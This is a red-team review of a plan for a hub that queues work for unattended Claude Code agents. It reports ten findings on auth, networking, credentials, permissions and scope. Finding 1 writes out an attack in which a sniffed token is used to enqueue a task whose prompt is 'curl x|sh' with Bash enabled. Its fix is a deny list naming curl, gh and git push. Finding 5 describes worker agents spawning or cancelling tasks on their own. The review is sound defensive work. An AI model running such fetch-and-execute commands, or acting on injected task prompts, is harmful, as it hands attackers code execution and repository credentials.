# Red team: Assumption Destroyer + Scope Auditor — AgentMesh plan

Date: 2026-10-16 · Reviewer: code-reviewer · Plan: `plans/261016-1933-agent-mesh-lease-queue-hub/`
Scope: plan.md, phase-01..05, handoff, both researcher reports. Local checks on <hub-host> (claude 2.1.301, go1.26.2, gh 2.45.0). Go spike in scratchpad (not committed).

## Verified OK (drop the UNVERIFIED tags; no finding)
- go-sdk v1.8.0 (latest on proxy): `StreamableHTTPOptions.Stateless` exists (`go doc ... StreamableHTTPOptions`); `NewStreamableHTTPHandler(getServer func(*http.Request) *Server, opts *StreamableHTTPOptions)`; `NewInMemoryTransports()` exists. Note: default localhost DNS-rebinding protection + 413 body limit.
- modernc.org/sqlite v1.60.1: the `_pragma` DSN gives `journal_mode = wal`, SQLite 3.53.4. `UPDATE…WHERE id=(SELECT … json_each(?)) RETURNING` returned `2 1 <nil>`.
- gopsutil v4.26.9 `load.Avg`/`mem.VirtualMemory`/`cpu.Counts`: `CGO_ENABLED=0 GOOS=darwin GOARCH=arm64 go build` gives DARWIN_OK, and linux/amd64 builds too.
- modernc + gopsutil go.mod need `go 1.26.0`. go-sdk needs `go 1.25.0`. Local go1.26.2 is fine. Pin `go 1.26` in go.mod.
- `CLAUDE_CODE_OAUTH_TOKEN` appears 131x in the claude 2.1.301 binary (`grep -a`), plus `CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR`. The env name is real.
- `claude mcp add` accepts `-t/--transport http`, `-s/--scope user`, `-H/--header <header...>`. `--max-turns` is absent. `--permission-prompts none` exists.

---

## Finding 1: Host allowlist ignores `allowed_tools`, so a token holder gets shell on every host
- **Severity:** Critical
- **Location:** phase-03 §Requirements (host-side authority), §Risk "Stolen hub token"; phase-01 schema `allowed_tools`; phase-02 `TaskAddIn.AllowedTools`
- **Flaw:** The host vetoes only `permission_mode` and budget. `allowed_tools` comes from the task spec and goes straight to `--allowedTools`. The handoff requirement "allowlisted commands only (no arbitrary shell)" is silently dropped. The token travels in cleartext HTTP on wifi (plan.md open Q3).
- **Failure scenario:** Someone sniffs the bearer on the shared wifi. They POST `/api/v1/tasks` with `{"repo":"agent-mesh","allowed_tools":["Bash"],"permission_mode":"acceptEdits","prompt":"curl x|sh"}`. The Ubuntu daemon passes the host checks (mode is allowed, budget is under the cap) and runs `claude -p --allowedTools Bash`. That is arbitrary code execution as <user>, with gh `repo`+`workflow` token scopes available (`gh auth status`). The "host-side allowlists bound damage" mitigation is false.
- **Evidence:** phase-03:42 "reject claimed task … if `permission_mode` not allowed or budget > cap" (no tools check). phase-03:108 `[--allowedTools <comma list>]`. phase-03:157 "Stolen hub token → enqueue arbitrary prompt | L×H | host-side repo/permission-mode/budget allowlists". phase-01:81 `allowed_tools TEXT NOT NULL DEFAULT '[]'`. handoff:23 "allowlisted commands only (no arbitrary shell)". `gh auth status` shows "Token scopes: 'gist', 'read:org', 'repo', 'workflow'".
- **Suggested fix:** Remove free-form `allowed_tools` from TaskSpec. Replace it with `tool_profile` (enum key) that resolves only on the host through a `[tool_profiles]` table in daemon.toml (e.g. `edit-only`, `go-dev = ["Bash(go test *)","Bash(go build *)","Bash(git commit *)"]`). The host rejects unknown profiles. Pass `--disallowedTools "Bash(git push *)" "Bash(gh *)" "Bash(curl *)"` (the flag exists in `claude --help`).

## Finding 2: `<hub-host>.local` resolves to a Docker bridge IP, not the hub's bind address
- **Severity:** Critical
- **Location:** plan.md Key decisions "static config + `<hub-host>.local`"; phase-02 `.mcp.json` url and CLI default; phase-03 daemon.toml `hub_url`; phase-05 §Network
- **Flaw:** The hub binds only `<hub-lan-ip>`. Every client defaults to `<hub-host>.local`. Avahi on this box publishes Docker bridge and link-local v6 addresses.
- **Failure scenario:** On Ubuntu, the daemon, CLI, and the Claude session's `.mcp.json` resolve to `172.18.0.1:8787` and get connection refused, because the hub listens on <hub-lan-ip> only. The daemon backs off for 5 min at a time and runs nothing overnight. On the Mac, mDNS can return any of the published addresses (docker 172.17/172.18 or zone-less fe80::), so failures are intermittent. The phase-05 check `dscacheutil -q host` would "pass" while returning a wrong IP.
- **Evidence:** phase-05:24 `listen = "<hub-lan-ip>:8787"` … "Clients use `<hub-host>.local`". phase-03:24 `hub_url = "http://<hub-host>.local:8787"`. phase-02:54, phase-02:66. Command output:
  ```
  $ getent ahosts <hub-host>.local | head -1
  172.18.0.1      STREAM <hub-host>.local
  $ getent hosts <hub-host>.local  ->  10x fe80::… <hub-host>.local
  $ ip -4 addr: <hub-lan-ip>/24 <wifi-iface> (dynamic), 172.17.0.1 docker0, 172.18.0.1 <docker-bridge>
  ```
- **Suggested fix:** Use `http://<hub-lan-ip>:8787` in every default and example, plus a DHCP reservation. Alternatively set avahi `allow-interfaces=<wifi-iface>` and `publish-aaaa-on-ipv4=no`, and add a phase-05 check that asserts the resolved IP equals the bind IP on both hosts. The Ubuntu daemon should use the same LAN URL, not localhost, because the hub is not bound to loopback.

## Finding 3: gh and git push credentials sit in OS keyrings that headless daemons can't unlock; no gate tests this
- **Severity:** High
- **Location:** phase-03 step 1 (go/no-go tests only `claude`); phase-03 preflight `gh auth status`; phase-05 linger and "Ubuntu reboot → running without login"
- **Flaw:** The plan treats keychain access as a Mac-only, claude-only risk. On Ubuntu, gh stores its token in the GNOME keyring, and git push over HTTPS goes through `gh auth git-credential`. After a reboot with linger and no GUI login, the login keyring is locked, so `gh` and `git push` fail. The Mac has the same problem: gh ≥2.24 uses the macOS keychain, and git uses osxkeychain or ssh-agent.
- **Failure scenario:** Ubuntu reboots overnight (updates or power). The units come back via linger, claude works (it uses `~/.claude/.credentials.json`), and the task runs and spends money. Then `git push` fails at publish step 4, or gh fails at step 5. Per phase-03:88 a gh error becomes "complete with pr_url=''". If the push itself fails, the plan defines no path at all. Every task burns budget and no PRs appear.
- **Evidence:** phase-03:122 "GO/NO-GO: Mac auth under launchd" (claude only). phase-03:131 preflight `gh auth status`. phase-05:20 linger. phase-05:54 "Ubuntu reboot → hub + daemon running without login". Command output: `gh auth status`, which reports "Logged in … (keyring)"; `grep -c oauth_token ~/.config/gh/hosts.yml` gives `0`; `git config` has `credential.https://github.com.helper !/usr/bin/gh auth git-credential`; `~/.local/share/keyrings/login.keyring` exists.
- **Suggested fix:** Extend the step-1 gate to both hosts and to `git push` + `gh pr create` under the real unit (Ubuntu: after a reboot with no login; Mac: LaunchAgent with a locked screen). Provide `GH_TOKEN` (fine-grained PAT, contents+PR on the allowlisted repos) via the 0600 env file the daemon already loads. Change preflight to `gh auth token >/dev/null` plus `git ls-remote` per repo. Define the push-failure path: fail(retry=false, "push failed") and keep the worktree.

## Finding 4: Ubuntu "reboot → runs without login" is false: wifi doesn't autoconnect and user units can't wait for the network
- **Severity:** High
- **Location:** phase-05 §Requirements systemd units, Success criterion "Ubuntu reboot → hub + daemon running without login"; Risk "DHCP changes hub IP"
- **Flaw:** The hub binds a fixed LAN IP. The active wifi profile has autoconnect=no. A systemd **user** manager can't order on `network-online.target`. `Restart=on-failure` with the default StartLimitBurst (5 in 10 s) puts the unit into permanent `failed`.
- **Failure scenario:** After a reboot, <wifi-iface> has no <hub-lan-ip>. Hub `listen` fails with "cannot assign requested address", restarts 5 times in under a second, and stays failed. Mac and Ubuntu daemons back off all night. Even when wifi autoconnects, the race between the user unit start and DHCP produces the same result.
- **Evidence:** phase-05:20-22 units with `Restart=on-failure` only. phase-05:54. Command output: `nmcli -f NAME,AUTOCONNECT,ACTIVE connection show` gives `<wifi-profile>  no  yes  <wifi-iface>`, and the address is `<hub-lan-ip>/24 … dynamic`. `loginctl show-user -p Linger` gives `Linger=no` today.
- **Suggested fix:** Add `nmcli connection modify "<wifi-profile>" connection.autoconnect yes` to the phase-05 manual steps. Set `RestartSec=10` and `StartLimitIntervalSec=0` on both units. In the hub, retry bind for about 2 min before exiting. Alternatively, bind `0.0.0.0` and enforce LAN-only with ufw. Add a real reboot test to phase-05 step 5.

## Finding 5: Worker sessions get the agentmesh MCP tools and the user's ClaudeKit hooks; "harmless" is wrong
- **Severity:** High
- **Location:** phase-02 Risk row "Workers … silently load `.mcp.json`"; phase-02 Requirements user-scope `claude mcp add -s user`; phase-03 Runner command
- **Flaw:**
  - (a) The MCP surface includes `task_add`, `task_cancel`, `task_requeue`, not only add/list.
  - (b) The documented user-scope install puts agentmesh into `~/.claude.json`, so every worker on that host, in every repo, loads it. `.mcp.json` alone affects only agent-mesh worktrees.
  - (c) Workers inherit the user's global hooks (privacy-block, scout-block, notify, session-init, usage-quota). These change worker behavior and fire desktop notifications all night.
- **Failure scenario:** A worker prompted "split this refactor into subtasks" calls `task_add` repeatedly. Each new task spawns more, and the spend is bounded only by per-task budget × attempts × task count. A confused worker calls `task_cancel` on a sibling. Separately, `privacy-block.cjs` emits `@@PRIVACY_PROMPT@@`, which needs `AskUserQuestion`. Under `--permission-prompts none` it denies, and tasks that touch config/env files fail or stall with no signal to the plan.
- **Evidence:** phase-02:20 tool list including `task_cancel`, `task_requeue`. phase-02:25 `claude mcp add --transport http -s user agentmesh …`. phase-02:81 "harmless (tools only add/list); daemon can pass `--strict-mcp-config` later if noisy". phase-03:106-108 runner argv (no `--strict-mcp-config`, no `--setting-sources`). Command output from `~/.claude/settings.json`: hooks `Stop, Notification, SessionStart, UserPromptSubmit, SubagentStart, PreToolUse[descriptive-name, scout-block, privacy-block], PostToolUse, SubagentStop`.
- **Suggested fix:** The runner always passes `--strict-mcp-config` (no `--mcp-config`) unless the host opts in. Decide explicitly whether workers load user hooks: `--setting-sources project,local` or a worker `--settings` file. Test this in phase-03 step 2 with the real `~/.claude`. Fix the risk row.

## Finding 6: Default permissions give workers no Bash, so they can't test, build, or commit as the prompt tells them
- **Severity:** High
- **Location:** phase-01 schema defaults; phase-03 unattended system prompt, step-2 verification prompt, Runner command
- **Flaw:** The defaults are `permission_mode=acceptEdits`, `allowed_tools='[]'`, and `--permission-prompts none`. The help text says "anything that would prompt is denied automatically", so every Bash call is denied. `dontAsk` (the other allowed mode) also denies anything not pre-approved. The appended prompt still says "commit with clear messages".
- **Failure scenario:** Every default task produces unverified edits. Claude cannot run `go test` or `git commit`. The daemon's "uncommitted leftovers" commit (publish step 1) hides this, so PRs look normal but were never built. The step-2 smoke prompt ("create hello.txt … and commit") will show the commit denied. The plan has no branch for that outcome.
- **Evidence:** phase-01:80-81 `permission_mode … DEFAULT 'acceptEdits'`, `allowed_tools … DEFAULT '[]'`. phase-03:45 "commit with clear messages". phase-03:107-108. phase-03:128. `claude --help`: "--permission-prompts … "none" (nobody: anything that would prompt is denied automatically…)".
- **Suggested fix:** Resolve this together with Finding 1. Host-defined tool profiles give a sane default (`Bash(git add *)`, `Bash(git commit *)`, and the repo's test/build commands). Make step 2 assert that the commit was made by claude, not by the daemon. Have the report flag "leftover commit" PRs.

## Finding 7: Poison host and first-poller veto: one bad host or tighter cap marks the whole queue `stuck`
- **Severity:** High
- **Location:** phase-03 Per-task flow (allowlist reject → `fail(retry=false)`; crash → `fail(retry=true)`); preflight; phase-01 claim SQL
- **Flaw:**
  - (a) Host-side rejection is final for the task, even though another host might accept it. The claim does not send host caps, so the hub can't filter.
  - (b) Infra failures (expired OAuth, "not logged in", missing PATH) fail retry=true and consume an attempt. A broken host keeps claiming every 30 s with no circuit breaker. Preflight `claude --version` doesn't verify auth.
- **Failure scenario:**
  - (a) Mac has `max_budget_usd_cap=2` and Ubuntu has 5. A $3 task is claimed first by the idle Mac and becomes `stuck` permanently.
  - (b) The Mac OAuth token expires at 1 am. The Mac claims the next task, claude exits 1, and the task is requeued. Because the Mac is idle, it wins the next poll again. By 3 am every queued task has burned 3 attempts and is `stuck`, while Ubuntu sat idle.
- **Evidence:** phase-03:42, phase-03:72 `reject──> fail(retry=false)`. phase-03:79 `exit≠0 && no result line → fail(retry=true …) (crash/infra)`. phase-03:131 preflight `claude --version`. phase-01:116-119 claim WHERE (no budget/mode filter). phase-01:185 "retry=false → stuck".
- **Suggested fix:** Send `max_budget_usd` and `permission_modes` in the claim and filter in SQL. Then host rejection only covers non-hub-expressible checks, and it should be "release without attempt" (new `release` op that decrements attempts and returns to queued). Add a daemon circuit breaker: after 2 consecutive infra failures, stop claiming and report `unhealthy` in hosts. Change preflight and per-claim checks to `claude auth status`.

## Finding 8: "Frozen" stub contract is incomplete, so parallel phases 2/3/4 will need P1 file edits
- **Severity:** Medium
- **Location:** plan.md §Parallel execution; phase-01 §Layout contract stubs, Store interface sketch; phase-02 `morning_report`; phase-03 integration tests; phase-05 ldflags
- **Flaw:** Only 5 entry points are frozen. The seams parallel sessions actually depend on are unspecified:
  - (a) A store query for "updated>=since ∪ non-terminal". Phase 2's `morning_report` must rebuild the hub handler's logic, and phase 4 says `store.List(since)`. Neither signature is defined, so it is duplicated or missing.
  - (b) An exported hub constructor that takes a `*store.Store` with an injectable clock. Phase 3's test "advances hub clock past TTL" and "restart hub" can't be written against `internal/hub` without one. Phase 3 is forbidden to touch hub.
  - (c) Version plumbing. `-X main.version` lives in `cmd/` (P1 only), but the daemon must send `agent_version`, and `daemon.Run(ctx,args)` has no version parameter.
  - (d) `httptest` "restart" gets a new port, so a restart test needs a fixed listener.
- **Failure scenario:** Three parallel sessions each hit "message lead". The lead edits P1 files mid-flight, the merge order 4→2→3 conflicts, or each session improvises its own query. The phase-01 risk row (M×H) materializes.
- **Evidence:** phase-01:53-59 stub list. phase-01:133-140 sketch has only Claim/Heartbeat/Complete/Fail. phase-01:154 report handler composition. phase-02:34, phase-04:37 `store.List(since)`. phase-03:139, phase-03:141. phase-05:17 `-X main.version`. plan.md:71 "Stub signatures (phase 1) are frozen".
- **Suggested fix:** Freeze these in phase 1:
  - `store.ListForReport(ctx, since) ([]api.Task, error)` used by both the REST handler and MCP;
  - `hub.NewServer(cfg, st *store.Store) *Server` with `Handler()`;
  - `store.New(db, now func() time.Time, ttl)`;
  - `internal/version.Version` var set by ldflags (`-X …/internal/version.Version`);
  - a `hubtest` helper with a fixed listener for restart tests.

## Finding 9: Worktree leaks silently stop claims, and `hosts` misreports throttled hosts as dead
- **Severity:** Medium
- **Location:** phase-03 Per-task flow (409/stop paths "keep worktree"); thresholds include `max_worktrees` counting human worktrees; phase-01 hosts updated only via claim/heartbeat; phase-05 success "hosts shows both hosts with recent last_seen"
- **Flaw:**
  - Lease-lost, cancel, timeout, stuck, and push-fail paths all keep worktrees, and no GC exists.
  - `max_worktrees=6` includes the human's own worktrees.
  - Load is sent only on claim, and claim is sent only when under thresholds. A throttled host never talks to the hub.
- **Failure scenario:** On the Mac, the human has 4 worktrees, one task is cancelled, and one lease is lost after sleep. That makes 6, and the Mac never claims again. Because it no longer claims, `last_seen` goes stale, and the morning report shows the Mac as dead with no reason. This is the exact "Mac lags from worktrees" problem, now invisible.
- **Evidence:** phase-03:75, phase-03:85 "keep worktree". phase-03:32 `max_worktrees = 6 # … incl. human ones`. phase-03:102 claim gate. phase-01:25 "Hosts table updated from load piggybacked on claim/heartbeat (no separate ping)". phase-05:55.
- **Suggested fix:**
  - Count only `<state_dir>/worktrees/*` against an agent cap, and keep human load in the load/mem metrics.
  - Add a GC: remove agent worktrees whose task is terminal and older than N days (keep stuck ones for the resume hint).
  - Send a cheap `POST /hosts/{name}/load` every poll tick, even when not claiming, including a `throttled_reason`.

## Finding 10: 20 h is unrealistic, and v1 carries cuttable scope
- **Severity:** Medium
- **Location:** plan.md effort 20h, phase table; phase-03 7h; tmux mode; spool step-machine; backup timer; priority/requeue/host fields
- **Flaw:** Phase 3 at 7 h includes:
  - a Mac go/no-go needing the user physically present;
  - real-claude fixture capture;
  - runner (direct + tmux), spool with step replay, publish with PR-close compensation;
  - 5 integration scenarios with process-group orphan checks;
  - Ubuntu e2e, then Mac e2e.

  Findings 3-4 add credential and boot work. The plan also ships scope it admits is low value.
- **Failure scenario:** Phase 3 overruns 2-3×. The parallel sessions finish 2/4 and idle. Phase 5's overnight soak slips, and the "v1" goal (stop duplicate overnight work) is delayed by features nobody needs yet.
- **Evidence:** plan.md:6 `effort: 20h`. plan.md:56 phase 3 `7h`. phase-03:116 "tmux mode … Value is limited with `-p` (pane shows nothing; peek = `tail -f` log) — keep it optional, default off". phase-03:92 spool `{…step}` replay. phase-05:25 backup timer.
- **Suggested fix:**
  - Cut tmux mode entirely; `tail -f` the log.
  - Shrink the spool to one pending `complete/fail` JSON per task. Replay = heartbeat-then-complete; no step machine.
  - Replace the backup timer with a one-line cron or defer it.
  - Defer `priority` and `requeue` (`cancel` + re-add works).
  - Re-estimate phase 3 at about 12 h and the total at about 28 h. Make the Mac track a separate, optional phase 3b so Ubuntu-only v1 can ship.

---

## Unresolved questions
1. Is the repo or any allowlisted repo public? If so, PR titles from prompt line 1 (phase-03:87) could leak prompt content.
2. Should workers run with user ClaudeKit hooks at all (Finding 5c)? This is a product decision for the user.
3. Mac gh/git credential storage and avahi address set: not checkable from Ubuntu.

Status: DONE
Summary: 10 findings (2 Critical, 5 High, 3 Medium). The worst two: unvalidated `allowed_tools` gives anyone with the token shell on both hosts, and `<hub-host>.local` resolves to a Docker IP (172.18.0.1) while the hub binds only <hub-lan-ip>. Several UNVERIFIED items (go-sdk Stateless, modernc DSN, gopsutil darwin, OAuth env name) were confirmed OK by local spike.
